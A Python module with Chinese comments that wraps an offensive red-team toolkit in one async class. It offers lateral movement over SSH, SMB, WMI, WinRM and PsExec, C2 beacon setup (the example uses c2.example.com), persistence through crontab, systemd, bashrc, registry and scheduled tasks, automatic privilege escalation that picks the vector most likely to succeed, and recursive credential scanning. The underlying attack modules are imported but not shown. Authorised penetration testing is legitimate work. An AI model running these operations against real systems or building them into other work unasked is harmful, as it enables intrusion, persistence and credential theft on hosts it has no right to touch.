"""红队操作 — 封装横向移动/C2/持久化/提权/凭据发现

提供红队常用操作的统一接口。

Usage:
    redteam = RedTeam()
    result = await redteam.lateral_move("192.168.1.100", method="ssh", username="admin", password="pass")
    result = await redteam.c2_start("c2.example.com", port=443, protocol="https")
"""

from __future__ import annotations

import logging
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


class RedTeam:
    """红队操作接口

    封装 core/ 中的横向移动、C2、持久化、提权和凭据模块。

    所有方法均返回 dict，成功时 {"success": True, ...}，
    失败时 {"success": False, "error": "..."}。
    """

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        self._config = config or {}

    async def lateral_move(
        self,
        target: str,
        method: str = "ssh",
        username: str = "",
        password: str = "",
        command: Optional[str] = None,
        **kwargs,
    ) -> Dict[str, Any]:
        """横向移动

        支持的方法: ssh, smb, wmi, winrm, psexec

        Args:
            target: 目标 IP 或主机名
            method: 移动方法
            username: 用户名
            password: 密码
            command: 要执行的命令
            **kwargs: 额外参数（如 domain, hash, port 等）

        Returns:
            执行结果字典
        """
        try:
            module = self._get_lateral_module(method)

            # 配置连接参数
            module.target = target
            if hasattr(module, "username"):
                module.username = username
            if hasattr(module, "password"):
                module.password = password

            # 设置额外参数
            for key, value in kwargs.items():
                if hasattr(module, key):
                    setattr(module, key, value)

            # 连接
            connected = module.connect()
            if not connected:
                return {"success": False, "error": f"连接失败: {target} via {method}"}

            result_data: Dict[str, Any] = {"success": True, "method": method, "target": target}

            # 执行命令
            if command:
                exec_result = module.execute(command)
                result_data["output"] = exec_result.output if hasattr(exec_result, "output") else str(exec_result)
                result_data["exit_code"] = getattr(exec_result, "exit_code", None)

            # 断开连接
            module.disconnect()
            return result_data

        except Exception as e:
            logger.error("lateral_move 失败: %s", e)
            return {"success": False, "error": str(e)}

    async def c2_start(
        self,
        server: str,
        port: int = 443,
        protocol: str = "https",
        interval: float = 60.0,
        jitter: float = 0.2,
        **kwargs,
    ) -> Dict[str, Any]:
        """启动 C2 Beacon

        Args:
            server: C2 服务器地址
            port: 端口号
            protocol: 通信协议 (http/https/dns/websocket)
            interval: 心跳间隔（秒）
            jitter: 抖动比例 (0.0-1.0)

        Returns:
            Beacon 信息字典
        """
        try:
            from core.c2.beacon import Beacon, BeaconConfig

            config = BeaconConfig(
                server=server,
                port=port,
                protocol=protocol,
                interval=interval,
                jitter=jitter,
                **kwargs,
            )
            beacon = Beacon(config)
            beacon_id = beacon.beacon_id

            return {
                "success": True,
                "beacon_id": beacon_id,
                "server": server,
                "port": port,
                "protocol": protocol,
                "status": "initialized",
            }
        except Exception as e:
            logger.error("c2_start 失败: %s", e)
            return {"success": False, "error": str(e)}

    async def persist(
        self,
        target: str = "",
        platform: str = "linux",
        method: str = "crontab",
        command: str = "",
        **kwargs,
    ) -> Dict[str, Any]:
        """安装持久化

        Args:
            target: 目标路径或标识
            platform: 平台 (linux/windows)
            method: 持久化方法 (linux: crontab/systemd_service/bashrc 等,
                    windows: registry/scheduled_task/service 等)
            command: 要持久化的命令
            **kwargs: 方法特定参数

        Returns:
            持久化结果字典
        """
        try:
            if platform == "linux":
                from core.persistence.linux_persistence import LinuxPersistence

                persistence = LinuxPersistence()
                if hasattr(persistence, method):
                    result = getattr(persistence, method)(command=command, **kwargs)
                else:
                    return {"success": False, "error": f"不支持的 Linux 持久化方法: {method}"}
            elif platform == "windows":
                from core.persistence.windows_persistence import WindowsPersistence

                persistence = WindowsPersistence()
                if hasattr(persistence, method):
                    result = getattr(persistence, method)(command=command, **kwargs)
                else:
                    return {"success": False, "error": f"不支持的 Windows 持久化方法: {method}"}
            else:
                return {"success": False, "error": f"不支持的平台: {platform}"}

            if hasattr(result, "__dataclass_fields__"):
                from dataclasses import asdict
                return {"success": True, **asdict(result)}
            return {"success": True, "data": str(result)}

        except Exception as e:
            logger.error("persist 失败: %s", e)
            return {"success": False, "error": str(e)}

    async def privesc(
        self,
        target: str,
        platform: str = "linux",
        config: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """权限提升

        Args:
            target: 目标标识
            platform: 平台 (linux/windows)
            config: 提权配置

        Returns:
            提权结果字典
        """
        try:
            from core.privilege_escalation.base import EscalationConfig

            esc_config = EscalationConfig(**(config or {}))

            if platform == "linux":
                from core.privilege_escalation.linux import LinuxPrivEsc

                privesc = LinuxPrivEsc(config=esc_config)
            elif platform == "windows":
                from core.privilege_escalation.windows import WindowsPrivEsc

                privesc = WindowsPrivEsc(config=esc_config)
            else:
                return {"success": False, "error": f"不支持的平台: {platform}"}

            # 先枚举提权向量
            vectors = privesc.enumerate()
            if not vectors:
                return {"success": False, "error": "未发现可用的提权向量"}

            # 尝试利用最高概率的向量
            best_vector = max(vectors, key=lambda v: v.success_probability)
            result = privesc.escalate(best_vector)

            return result.to_dict() if hasattr(result, "to_dict") else {
                "success": getattr(result, "success", False),
                "method": str(getattr(result, "method", "")),
                "vector": best_vector.name,
            }
        except ImportError as e:
            logger.error("privesc 模块导入失败: %s", e)
            return {"success": False, "error": f"模块不可用: {e}"}
        except Exception as e:
            logger.error("privesc 失败: %s", e)
            return {"success": False, "error": str(e)}

    async def credential_find(
        self,
        target_path: str,
        recursive: bool = True,
        file_patterns: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """凭据/敏感信息搜索

        Args:
            target_path: 目标目录路径
            recursive: 是否递归搜索
            file_patterns: 文件模式过滤，如 ["*.py", "*.conf", "*.env"]

        Returns:
            搜索结果字典
        """
        try:
            from core.credential.password_finder import PasswordFinder

            finder = PasswordFinder()
            findings = finder.scan_directory(
                directory=target_path,
                recursive=recursive,
                file_patterns=file_patterns,
            )

            return {
                "success": True,
                "total": len(findings),
                "findings": [
                    {
                        "type": f.secret_type.value if hasattr(f.secret_type, "value") else str(f.secret_type),
                        "file": f.file_path,
                        "line": f.line_number,
                        "confidence": f.confidence,
                        "context": f.context,
                    }
                    for f in findings
                ],
            }
        except Exception as e:
            logger.error("credential_find 失败: %s", e)
            return {"success": False, "error": str(e)}

    def _get_lateral_module(self, method: str):
        """获取横向移动模块实例"""
        method_map = {
            "ssh": ("core.lateral.ssh", "SSHLateral"),
            "smb": ("core.lateral.smb", "SMBLateral"),
            "wmi": ("core.lateral.wmi", "WMILateral"),
            "winrm": ("core.lateral.winrm", "WinRMLateral"),
            "psexec": ("core.lateral.psexec", "PSExecLateral"),
        }

        if method not in method_map:
            raise ValueError(f"不支持的横向移动方法: {method}，可用: {list(method_map.keys())}")

        module_path, class_name = method_map[method]
        import importlib
        module = importlib.import_module(module_path)
        cls = getattr(module, class_name)
        return cls()
